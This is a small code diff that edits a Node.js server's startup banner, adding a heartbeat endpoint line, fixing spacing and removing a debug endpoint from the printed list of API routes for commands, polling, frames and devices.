+    console.log('⚡  WebSocket    : Stream Only (Active on "start")');
+    console.log('❤️  Heartbeat    : POST /api/heartbeat');
     console.log('📡  HTTP Command : POST /api/command');
     console.log('⏳  HTTP Poll    : GET  /api/commands/:deviceId');
-    console.log('🖼️   Frame        : POST/GET /api/frame');
+    console.log('🖼️  Frame        : POST/GET /api/frame');
     console.log('📱  Devices      : GET  /api/devices');
-    console.log('🔍  Debug        : GET  /api/debug');
     console.log('═══════════════════════════════════════════════════');
     console.log('');
 });
